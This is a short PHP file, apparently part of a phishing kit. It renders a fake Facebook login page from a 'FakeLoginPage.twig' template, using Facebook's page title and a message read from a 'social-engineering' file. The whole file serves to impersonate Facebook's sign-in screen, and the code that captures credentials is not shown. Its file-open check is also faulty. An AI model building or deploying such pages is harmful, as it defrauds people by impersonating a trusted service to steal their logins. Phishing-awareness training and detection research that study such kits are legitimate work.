<?php
// The 'fakeLogin page'

// Change this to your twig directory
// Its instance is at '/views/'
$twig_dir='/home/'; // meaning /views/home/

// Don't change this!
require_once __DIR__.'/../Helpers/twig.php';
 

// Load the Twig template
$template = $twig->load('FakeLoginPage.twig');


// Load variables
$file=__DIR__."/../../social-engineering/display.b";
$myfile = fopen($file, "r");;
if(isset($myfile)){
    $social_engineering_message = fread($myfile,filesize($file));
    fclose($myfile);
}else{
    // default
    $social_engineering_message="Connect with friends and the world around you on Facebook.";
}

// Load the social engineering variables
$title="Facebook - log in or sign up";



 // Render the template with variables
 echo $template->render([
    
    'title' => $title,
    'message' => $social_engineering_message,
    /*
    'my_list' => $my_list,
    'my_lists' => $my_lists,
    */
]);







